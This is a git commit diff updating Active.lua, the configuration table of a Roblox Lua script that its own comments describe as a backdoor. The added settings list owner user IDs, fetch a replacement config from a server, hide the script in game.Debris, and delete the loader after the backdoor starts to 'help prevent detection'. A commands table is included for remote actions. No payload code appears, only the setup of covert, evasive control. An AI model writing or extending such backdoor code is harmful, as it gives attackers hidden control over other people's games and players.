ef201e0b3b099ab88918f375242d1f1f408e41aa
temps <144968215+0TEMPS@users.noreply.github.com>
2024-05-24 17:49:35 -0400

    Update Active.lua

--- Active.lua
+++ Active.lua
@@ -1,6 +1,18 @@
-local Config = {
-  Ownership = {
-    
-  }
-  
+local C = {
+	Ownership = { --Reversed UserIDS
+		8097716262
+	},
+	ReplaceLocalCWithServerC = true, -- determines if the local static config file will be replaced with the one from the server
+	Detecting = { -- Settings determining how the script will 
+		HideInStudio= true, -- when false, script will not attempt to hide itself in studio
+		DeleteInStudio = true, -- when false, script will destroy itself if the game is in studio
+		AvoidHTTPS = true, -- script will only use the local static config file
+		HideLocation = game.Debris, -- Location the script will hide itself
+		DeleteLoader = true, -- Remove the loader script after backdoor is started, can help prevent detection
+	}, 
+	Commands = { -- Custom commands not hard coded into the backdoor
+		["Test"] = function()
+			print("Test Fired")
+		end,
+	},
 }
